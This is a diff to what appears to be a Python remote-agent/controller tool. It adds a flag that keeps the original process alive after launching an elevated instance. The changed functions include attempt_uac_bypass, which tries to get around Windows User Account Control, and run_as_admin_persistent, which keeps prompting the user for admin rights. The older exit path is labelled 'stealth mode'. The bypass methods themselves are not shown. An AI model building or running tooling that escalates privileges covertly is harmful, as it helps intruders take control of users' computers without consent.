@@ -191,6 +191,7 @@ DEBUG_MODE = True  # Enable debug logging for troubleshooting
 UAC_PRIVILEGE_DEBUG = True  # Enable detailed UAC and privilege debugging
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
+KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC bypass (keep CMD window open)
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -2161,13 +2162,20 @@ def attempt_uac_bypass():
             # A separate elevated instance was launched
             # This current process is still NOT admin
             debug_print("⚠️ [UAC BYPASS] Elevated instance launched, but THIS process is still NOT admin")
-            debug_print("⚠️ [UAC BYPASS] THIS instance should EXIT to avoid duplicates")
             debug_print("⚠️ [UAC BYPASS] The elevated instance will take over")
-            log_message("⚠️ [UAC BYPASS] Elevated instance launched - exiting current instance", "warning")
+            log_message("⚠️ [UAC BYPASS] Elevated instance launched", "warning")
             
-            # Exit this non-admin instance to prevent duplicates
-            time.sleep(2)  # Give elevated instance time to fully start
-            sys.exit(0)  # Exit old instance, let elevated instance take over
+            if KEEP_ORIGINAL_PROCESS:
+                # Keep running (useful for debugging or manual operation)
+                debug_print("ℹ️ [UAC BYPASS] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
+                debug_print("ℹ️ [UAC BYPASS] Note: Both non-admin and admin instances are now running")
+                log_message("ℹ️ Original process will continue running alongside elevated instance", "info")
+                return True  # Consider it successful, continue running
+            else:
+                # Exit this non-admin instance to prevent duplicates (stealth mode)
+                debug_print("⚠️ [UAC BYPASS] Exiting original instance to avoid duplicates")
+                time.sleep(2)  # Give elevated instance time to fully start
+                sys.exit(0)  # Exit old instance, let elevated instance take over
     else:
         debug_print("=" * 80)
         debug_print("❌❌❌ [UAC BYPASS] FAILED! All methods failed!")
@@ -5597,9 +5605,13 @@ def run_as_admin():
             )
             # ShellExecuteW returns > 32 on success
             if result > 32:
-                log_message("[!] Elevated instance launched successfully - original instance will exit")
-                time.sleep(2)  # Give elevated instance time to start
-                sys.exit(0)
+                if KEEP_ORIGINAL_PROCESS:
+                    log_message("[!] Elevated instance launched - keeping original process running")
+                    return True
+                else:
+                    log_message("[!] Elevated instance launched successfully - original instance will exit")
+                    time.sleep(2)  # Give elevated instance time to start
+                    sys.exit(0)
             else:
                 log_message(f"[!] User declined elevation or launch failed (code: {result})")
                 return False
@@ -5657,13 +5669,17 @@ def run_as_admin_persistent():
             if result > 32:
                 debug_print("=" * 80)
                 debug_print("✅ [ADMIN] User clicked YES - Elevated instance starting")
-                debug_print("✅ [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
                 debug_print("=" * 80)
                 
-                # Exit this non-admin instance
-                # The new admin instance will take over
-                time.sleep(1)  # Brief delay to show message
-                sys.exit(0)  # ✅ EXIT OLD INSTANCE!
+                if KEEP_ORIGINAL_PROCESS:
+                    debug_print("ℹ️ [ADMIN] Keeping original process running (KEEP_ORIGINAL_PROCESS=True)")
+                    return True  # Keep running, don't exit
+                else:
+                    debug_print("✅ [ADMIN] THIS instance will now EXIT (to prevent duplicate)")
+                    # Exit this non-admin instance
+                    # The new admin instance will take over
+                    time.sleep(1)  # Brief delay to show message
+                    sys.exit(0)  # ✅ EXIT OLD INSTANCE!
             else:
                 # User clicked NO or Cancel
                 debug_print(f"❌ [ADMIN] Attempt {attempt}: User clicked NO or Cancel (result: {result})")
